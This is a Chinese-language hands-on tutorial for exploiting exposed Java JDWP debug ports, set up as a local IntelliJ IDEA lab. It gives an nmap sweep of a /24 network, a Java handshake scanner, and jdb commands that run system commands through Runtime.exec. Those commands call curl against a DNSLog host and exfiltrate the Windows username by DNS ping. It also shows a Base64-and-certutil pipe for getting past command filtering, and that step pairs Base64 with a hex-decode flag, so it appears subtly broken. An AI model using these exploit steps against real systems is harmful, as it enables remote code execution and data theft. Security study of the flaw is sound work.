# IDEA 平台 Java JDWP 完整操作手册
## 0x01 简介
```
JPDA(Java Platform Debugger Architecture)是Java平台调试体系结构的缩写
通过JPDA提供的API,开发人员可以方便灵活的搭建Java调试应用程序

JDWP(Java Debug Wire Protocol)是一种通信协议,JDWP是JPDA的一部分
它用于调试器和Java虚拟机之间的通信,Java虚拟机进行调试
它允许在其他计算机上调试进程,可以通过网络套接字或共享内存工作

🌟当其调试端口直接开放在公网上时,很容易被攻击者攻击并且获取系统权限,不过一般外网很少,内网才可能遇到
```

## 0x02 IDEA 测试环境搭建
### 2.1 新建Java项目
1. 打开IntelliJ IDEA，点击「New Project」
2. 左侧选择「Java」，Project SDK选择JDK 1.8版本，不勾选项目模板，点击「Next」
3. 填写项目名称（如`JDWP`），选择项目保存路径，点击「Finish」完成创建

### 2.2 编写测试类
1. 在左侧项目栏的`src`目录上右键 → New → Java Class
2. 类名填写`Test`，回车创建文件
3. 在编辑区写入测试代码：
```java
public class Test {
    public static void main(String[] args) {
        System.out.println("test123456");
    }
}
```
4. IDEA默认开启自动编译，也可按快捷键`Ctrl+F9`手动编译，编译后会生成`.class`字节码文件

### 2.3 配置JDWP启动参数并运行
1. 点击IDEA右上角的运行配置框（默认显示「Current File」）→ 选择「Edit Configurations...」
2. 左上角点击「+」→ 选择「Application」
3. 按如下要求填写配置项：
   - Name：自定义名称，例如`JDWP`
   - Main class：点击右侧文件夹图标，选中`Test`类
   - 点击「Modify options」下拉菜单，勾选「Add VM options」
   - 在新增的「VM options」输入框中，填入JDWP启动参数：
     ```
     -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=8003
     ```
![[Pasted image 20260615191033.png]]
> 说明：`suspend=y`表示程序启动后会挂起，等待调试器连接后再继续执行，方便后续调试与攻击操作。
4. 点击「Apply」→「OK」保存配置
5. 点击IDEA右上角的绿色运行按钮启动程序
6. 下方控制台输出如下内容，说明JDWP 8003调试端口已成功开启：
   ```
   Listening for transport dt_socket at address: 8003
   ```

## 0x03 IDEA 环境工具说明
在IDEA中操作JDWP主要有三种方式：
1. **内置终端 + jdb**：jdb是JDK自带的命令行调试工具，可直接在IDEA底部Terminal中执行，是漏洞利用的核心方式。
2. **IDEA远程调试功能**：通过IDEA原生的Remote JVM Debug配置连接目标JDWP服务，多用于正常开发调试，也可执行表达式实现命令执行。
3. **自定义代码**：在IDEA中编写Java代码，通过Socket与JDWP端口交互，实现批量检测与自动化利用。

## 0x05 JDWP 端口检测
####  0x05.1 端口扫描检测
可使用nmap工具对目标网段扫描，识别开放的JDWP服务，常见端口有8000、8003、5005等。扫描命令可直接在IDEA内置终端执行（需提前安装nmap）：
```
nmap -sT -sV -Pn -v 目标IP/24 -p 1-65535
```

####  0x05.2 Socket 握手检测代码
通过发送JDWP专属握手包，可精准判断目标端口是否为JDWP服务，在IDEA中实现步骤如下：
1. 在`src`目录右键 → New → Java Class，类名填写`JdwpScan`
2. 写入检测代码：
```java
import java.io.IOException;
import java.net.Socket;

public class JdwpScan {
    public static void main(String[] args) {
        // 目标IP与端口
        String ip = "127.0.0.1";
        int port = 8003;
        String handshake = "JDWP-Handshake";
        byte[] buffer = new byte[2048];

        try {
            // 建立Socket连接
            Socket socket = new Socket(ip, port);
            // 发送JDWP握手报文
            socket.getOutputStream().write(handshake.getBytes());
            // 读取服务端响应
            socket.getInputStream().read(buffer);
            String response = new String(buffer);

            // 校验响应中的握手标识
            if (response.contains(handshake)) {
                System.out.println("[+] 目标端口 " + port + " 确认是JDWP服务");
            } else {
                System.out.println("[-] 目标端口 " + port + " 不是JDWP服务");
            }
            socket.close();
        } catch (IOException e) {
            System.out.println("[-] 端口无法连接，请检查IP与端口是否开放");
        }
    }
}
```
3. 右键代码编辑区 → 选择「Run 'JdwpScan.main()'」运行代码
4. 在IDEA控制台查看检测结果

## 0x06 JDWP 攻击实操
本章节通过IDEA内置终端执行jdb命令，复现JDWP命令执行漏洞。

### 6.1 打开内置终端
点击IDEA底部状态栏的「Terminal」标签，打开内置命令行终端，默认路径为当前项目根目录。
### 6.2 连接目标JDWP服务
在终端中执行jdb连接命令，连接目标JDWP端口：
```
jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8003
```
### 6.3 线程操作与基础命令执行
1. 查看所有运行线程：(可跳过)
   ```
   threads
   ```
2. 选中main线程（线程ID以实际输出为准，通常为0x1）：(可跳过)
   ```
   thread 0x1
   ```
3. 单步执行激活线程，进入可执行表达式状态：
   ```
   stepi
   ```
![[Pasted image 20260615192131.png]]
4. 执行系统命令（DNSLog验证）：
   通过`eval`调用Runtime执行系统命令，Windows环境可使用curl或PowerShell发起请求：
   ```
   eval java.lang.Runtime.getRuntime().exec("curl 你的子域名.dnslog.cn")
   ```
   执行后访问DNSLog平台，若出现查询记录，说明命令执行成功。
![[Pasted image 20260615192151.png|499]]
### 6.4 带特殊符号的命令执行
当命令包含空格、管道符、特殊变量时，直接执行可能失败，可通过Base64编码绕过。

**示例：获取当前用户名并外带到DNSLog**
1. 构造Windows命令：
   ```cmd
   ping %username%.你的子域名.dnslog.cn
   ```
2. 在IDEA终端的PowerShell中生成Base64编码：
   ```powershell
   [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("ping %username%.你的子域名.dnslog.cn"))
   ```
3. 回到jdb交互界面，执行编码后的命令：
   ```
   eval java.lang.Runtime.getRuntime().exec("cmd /c \"echo 生成的Base64字符串 | certutil -decodehex -f - stdout | cmd\"")
   ```
4. 查看DNSLog平台，可获取到包含当前系统用户名的DNS查询记录。

### 补充：IDEA远程调试连接方式
除命令行jdb外，也可通过IDEA图形化调试界面连接JDWP服务：
1. 打开「Edit Configurations」→ 点击「+」→ 选择「Remote JVM Debug」
2. 填写目标主机IP和端口（如127.0.0.1:8003），选择对应JDK版本
3. 点击右上角调试按钮（虫子图标）即可连接，支持断点调试、变量查看、表达式执行。
